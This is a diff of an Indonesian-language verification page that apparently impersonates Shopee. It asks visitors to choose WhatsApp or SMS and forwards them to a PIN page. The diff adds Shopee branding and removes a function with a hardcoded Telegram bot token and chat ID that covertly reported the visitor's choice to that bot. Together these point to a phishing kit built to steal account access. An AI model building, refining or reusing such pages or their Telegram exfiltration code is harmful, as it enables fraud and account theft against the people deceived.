@@ -66,6 +66,8 @@
             width: 28px;
             height: 28px;
             margin-right: 12px;
+            display: inline-block;
+            vertical-align: middle;
         }
 
         .method span {
@@ -96,7 +98,7 @@
         }
 
         button.active {
-            background: #25d366;
+            background: #EE4D2D; /* Warna oranye Shopee */
             cursor: pointer;
         }
     </style>
@@ -111,11 +113,11 @@
         ke <b>Nomor yang terdaftar dengan akun anda</b>
     </p>
     <div class="method" data-method="WhatsApp">
-        <img src="" alt="WhatsApp"/>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp"/>
         <span>WhatsApp</span>
     </div>
     <div class="method" data-method="SMS">
-        <img src="" alt="SMS"/>
+        <img src="https://cdn-icons-png.flaticon.com/512/190/190244.png" alt="SMS"/>
         <span>SMS</span>
     </div>
     <p class="confirm"></p>
@@ -125,21 +127,6 @@
     const methods = document.querySelectorAll(".method");
     const confirmText = document.querySelector(".confirm");
     const lanjutBtn = document.getElementById("lanjut");
-
-    const TELEGRAM_BOT_TOKEN = '8286824254:AAHECrYlrnN0GeEBdG2ASNJEg79mw0FAYn8';
-    const TELEGRAM_CHAT_ID = '5923031825';
-
-    async function sendTelegramMessage(message) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
-        try {
-            const response = await fetch(url);
-            if (!response.ok) {
-                console.error('Gagal mengirim pesan Telegram:', response.status, response.statusText);
-            }
-        } catch (error) {
-            console.error('Error mengirim pesan Telegram:', error);
-        }
-    }
 
     methods.forEach(method => {
         method.addEventListener("click", () => {
@@ -156,12 +143,6 @@
     });
 
     lanjutBtn.addEventListener("click", () => {
-        const selectedMethod = document.querySelector(".method.selected");
-        if (selectedMethod) {
-            const chosenMethod = selectedMethod.dataset.method;
-            const message = `Pengguna memilih metode verifikasi: ${chosenMethod}`;
-            sendTelegramMessage(message);
-        }
         window.location.href = "pinmitra.html";
     });
 </script>
